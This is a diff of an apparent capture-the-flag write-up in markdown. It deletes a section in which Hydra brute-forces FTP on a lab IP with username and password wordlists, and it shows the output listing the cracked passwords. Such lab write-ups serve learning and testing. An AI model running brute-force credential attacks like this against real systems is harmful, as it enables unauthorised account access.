@@ -157,31 +157,7 @@ output:
 ```
 
 Now we're talkin!
-## FTP
-Attempting to bruteforce ftp using the same wordlists as the ssh:
-
-```
-# Hydra v9.7 run at 2026-10-21 23:01:07 on 10.66.132.149 ftp (hydra -L ./potentialusers.txt -P ./locks.txt -o hydra-ftp.txt 10.66.132.149 ftp)
-[21][ftp] host: 10.66.132.149   login: ftp   password: rEddrAGON
-[21][ftp] host: 10.66.132.149   login: ftp   password: ReDdr4g0nSynd!cat3
-[21][ftp] host: 10.66.132.149   login: ftp   password: Dr@gOn$yn9icat3
-[21][ftp] host: 10.66.132.149   login: ftp   password: RedDr4gonSynd1cat3
-[21][ftp] host: 10.66.132.149   login: ftp   password: R3DDr46ONSYndIC@Te
-[21][ftp] host: 10.66.132.149   login: ftp   password: ReddRA60N
-[21][ftp] host: 10.66.132.149   login: ftp   password: R3dDrag0nSynd1c4te
-[21][ftp] host: 10.66.132.149   login: ftp   password: dRa6oN5YNDiCATE
-[21][ftp] host: 10.66.132.149   login: ftp   password: ReDDR4g0n5ynDIc4te
-[21][ftp] host: 10.66.132.149   login: ftp   password: R3Dr4gOn2044
-[21][ftp] host: 10.66.132.149   login: ftp   password: R3dDRaG0Nsynd1c@T3
-[21][ftp] host: 10.66.132.149   login: ftp   password: Synd1c4teDr@g0n
-[21][ftp] host: 10.66.132.149   login: ftp   password: reddRAg0N
-[21][ftp] host: 10.66.132.149   login: ftp   password: 4L1mi6H71StHeB357
-[21][ftp] host: 10.66.132.149   login: ftp   password: REddRaG0N5yNdIc47e
-[21][ftp] host: 10.66.132.149   login: ftp   password: Dra6oN$yndIC@t3
-```
-
-All the passwords were for user `ftp` as well. Might be useful later on but SSH access is way more attractive right now.
-
+ 
 ## Accessing SSH as lin
 ![](../Image%20Trunk/Pasted%20image%2020261021231159.png)
 
